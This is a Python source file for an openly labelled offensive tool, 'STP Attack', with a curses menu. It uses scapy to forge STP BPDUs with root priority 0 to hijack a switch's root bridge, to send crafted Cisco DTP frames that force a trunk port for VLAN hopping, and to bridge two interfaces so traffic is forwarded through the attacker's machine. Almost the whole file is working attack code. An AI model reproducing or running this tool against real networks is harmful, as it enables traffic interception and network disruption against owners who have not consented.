import sys
import threading
import os
import netifaces
import curses
import json
import create_bridge
from types import SimpleNamespace
from platform import system
from scapy.all import *
from scapy.contrib.dtp import DTP, DTPDomain, DTPStatus, DTPType, DTPNeighbor
from scapy.layers.l2 import LLC, SNAP, Dot3
from time import sleep
from typing import Optional

try:
    with open('configs/config', 'r') as f:
        config = json.load(f, object_hook=lambda c: SimpleNamespace(**c))
except FileNotFoundError:
    print("Config file not found.")
    sys.exit(1)

try:
    with open('configs/attacks', 'r') as f:
        attacks = json.load(f, object_hook=lambda atk: SimpleNamespace(**atk))
except FileNotFoundError:
    print("Config file not found.")
    sys.exit(1)

choices = [getattr(getattr(attacks, attr), 'start', None) for attr in vars(attacks) if attr != 'quit' and getattr(getattr(attacks, attr), 'enabled', False)] + [getattr(attacks, 'quit')]
verbose = config.verbose
stdscr: Optional[curses.window] = None  # For GUI
stop_hijack_event = threading.Event()
stop_dtp_event = threading.Event()
system_interfaces = netifaces.interfaces()
banner = r""" (           (                                          
 )\ )  *   ) )\ )     (         )    )               )  
(()/(` )  /((()/(     )\     ( /( ( /(    )       ( /(  
 /(_))( )(_))/(_)) ((((_)(   )\()))\())( /(   (   )\()) 
(_)) (_(_())(_))    )\ _ )\ (_))/(_))/ )(_))  )\ ((_)\  
/ __||_   _|| _ \   (_)_\(_)| |_ | |_ ((_)_  ((_)| |(_) 
\__ \  | |  |  _/    / _ \  |  _||  _|/ _` |/ _| | / /  
|___/  |_|  |_|     /_/ \_\  \__| \__|\__,_|\__| |_\_\  

Use Arrow keys to navigate and Enter to choose an option
"""


def hijack(event, interfaces, pkt):
    mac = "00:00:00:00:00:01"
    pkt[0].src = mac
    pkt[0].rootid = 0
    pkt[0].rootmac = mac
    pkt[0].bridgeid = 0
    pkt[0].bridgemac = mac
    while not event.is_set():
        for interface in interfaces:
            sendp(pkt[0], loop=0, verbose=0, iface=interface)
        sleep(config.interval.stp)


def launch_stp_atk(interfaces):
    pkt = sniff(filter="ether dst 01:80:c2:00:00:00", count=1, iface=interfaces)
    stp_thread = threading.Thread(target=hijack, args=(stop_hijack_event, interfaces, pkt,))
    stp_thread.daemon = True
    stp_thread.start()


def enable_forwarding(bridge_name: str, interfaces: list):
    create_bridge.start(bridge_name, interfaces, verbose=verbose)


def disable_forwarding(bridge_name: str):
    create_bridge.end(bridge_name, verbose=verbose)


def dtp_atk(iface: list, mac_addr=str(RandMAC())):
    """Establish a trunk interface by sending a crafted dtp pkt"""
    # creating a pkt at the data-link layer (ethernet frame) with the Logical-Link control sublayer
    p = Dot3(src=mac_addr, dst="01:00:0c:cc:cc:cc", len=42)
    p /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
    p /= SNAP(OUI=0x0c, code=0x2004)  # including the Organisational Unique Identifier of the macaddr (cisco), configured as dtp pkt
    p /= DTP(ver=1, tlvlist=[
            DTPDomain(length=13, type=1, domain=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00'),
            DTPStatus(status=b'\x03', length=5, type=2),
            DTPType(length=5, type=3, dtptype=b'\xa5'),
            DTPNeighbor(type=4, neighbor=mac_addr, len=10)
        ])
    while not stop_dtp_event.is_set():
        for interface in iface:
            sendp(p, iface=interface, verbose=0)
        sleep(config.interval.dtp)


def launch_dtp_atk(interfaces: list):
    dtp_thread = threading.Thread(target=dtp_atk, args=(interfaces, "0c:7c:e8:46:d5:95",))
    dtp_thread.daemon = True
    dtp_thread.start()


def display_banner(extra=""):
    try:
        stdscr.addstr(banner + extra)
    except Exception:
        pass


def select_option(options, title):
    selection = 0
    while True:
        stdscr.clear()
        stdscr.addstr(f"{banner}\n\n{title}:\n")
        for i, option in enumerate(options):
            if i == selection:
                stdscr.addstr(f">>> {option}\n")
            else:
                stdscr.addstr(f"    {option}\n")

        c = stdscr.getch()
        if c == curses.KEY_UP and selection > 0:
            selection -= 1
        elif c == curses.KEY_DOWN and selection < len(options) - 1:
            selection += 1
        elif c == curses.KEY_ENTER or c == 10 or c == 13:  # Enter key
            stdscr.clear()
            stdscr.refresh()
            display_banner("\n")
            break

    return options[selection]


def select_interface(n):
    stdscr.addstr(banner)
    interface = select_option(system_interfaces, f'Please choose an interface for interface {n}')
    system_interfaces.remove(interface)
    stdscr.addstr(f"\nYou selected {interface} for interface {n}. Press any key to continue\n")
    stdscr.getch()
    return interface


def replace_choice(old, new):
    choices.insert(choices.index(old), new)
    choices.remove(old)


def gui(stdscr):
    display_banner(f"\n\nVersion: {config.version}\n\n\nPress any key to Start")
    stdscr.getch()

    if len(system_interfaces) > 2:
        interface1 = select_interface(1)
        interface2 = select_interface(2)
        selected_interfaces = [interface1, interface2]
    elif len(system_interfaces) == 2:
        interface1 = system_interfaces[0]
        interface2 = system_interfaces[1]
        selected_interfaces = system_interfaces
    elif len(system_interfaces) == 1:
        interface1 = system_interfaces[0]
        interface2 = "No interface available: Packet forwarding cannot be enabled."
        selected_interfaces = system_interfaces
        choices.remove(attacks.forward.start)
    else:
        print("You do not have enough network interfaces. Exiting...")
        sys.exit(1)

    while True:
        display = f"Interface 1: {interface1}\nInterface 2: {interface2}\n\nChoose what to do"
        action = select_option(choices, display)

        if action == attacks.quit:
            disable_forwarding("hijack_stp_br")
            curses.endwin()
            sys.exit(0)

        if action == attacks.hijack.start:
            stdscr.addstr(f"\nAttempting to hijacking root bridge...\n")
            stdscr.refresh()
            stop_hijack_event.clear()
            launch_stp_atk(selected_interfaces)
            replace_choice(attacks.hijack.start, attacks.hijack.stop)
            stdscr.addstr(f"Hijack started. Press any key to return\n")

        elif action == attacks.hijack.stop:
            stdscr.addstr(f"\nStopping root bridge hijacking...\n")
            stdscr.refresh()
            stop_hijack_event.set()
            sleep(3)  # Wait for while loop to exit
            replace_choice(attacks.hijack.stop, attacks.hijack.start)
            stdscr.addstr(f"Stopped hijack. Press any key to return\n")

        elif action == attacks.forward.start:
            enable_forwarding(config.bridge_name, selected_interfaces)
            replace_choice(attacks.forward.start, attacks.forward.stop)
            stdscr.addstr(f"\nEnabled packet forwarding. Press any key to return\n")

        elif action == attacks.forward.stop:
            disable_forwarding(config.bridge_name)
            replace_choice(attacks.forward.stop, attacks.forward.start)
            stdscr.addstr(f"Disabled packet forwarding. Press any key to return\n")

        elif action == attacks.trunk.start:
            stdscr.addstr(f"\nAttempting to enable trunking on...\n")
            stdscr.refresh()
            stop_dtp_event.clear()
            launch_dtp_atk(selected_interfaces)
            replace_choice(attacks.trunk.start, attacks.trunk.stop)
            stdscr.addstr(f"Enabled trunking. Press any key to return")

        elif action == attacks.trunk.stop:
            stdscr.addstr(f"\nDisabling trunk...\nNote: Switch may take awhile to recognise that trunk is gone.\n")
            stdscr.refresh()
            stop_dtp_event.set()
            sleep(3)  # Wait for while loop to exit
            replace_choice(attacks.trunk.stop, attacks.trunk.start)
            stdscr.addstr(f"Trunk disabled. Press any key to return\n")

        ##################################################################
        # Add more functions here
        ##################################################################

        stdscr.getch()


def check_terminal_size(min_width, min_height):
    height, width = stdscr.getmaxyx()
    curses.endwin()
    if width < min_width or height < min_height:
        return False
    return True


def main():
    global stdscr
    if system() != 'Linux':
        print("This script is only supported on Linux machines.")
        sys.exit(1)
    if os.geteuid() != 0:
        print("Please run this script with root privileges (sudo)")
        sys.exit(1)

    system_interfaces.remove("lo")  # loopback interface cannot be used
    if len(system_interfaces) < 2:
        print("WARNING: Only 1 network interface detected (loopback cannot be used).")
        if input("Forwarding packets will not be possible. Do you wish to continue? (Y/N): ").lower() not in ["y", "ye", "yes"]:
            sys.exit(1)
    elif len(system_interfaces) < 1:
        print("No network interface detected. Not possible to launch attack. ")
        sys.exit(1)

    stdscr = curses.initscr()
    curses.cbreak()
    stdscr.keypad(True)

    if not check_terminal_size(75, 24):
        print("Please make your terminal bigger to run the script.\nAt least 75 characters in length, 25 characters in height.")
        sys.exit(1)

    # Initialise curse GUI

    curses.wrapper(gui)


if __name__ == '__main__':
    main()
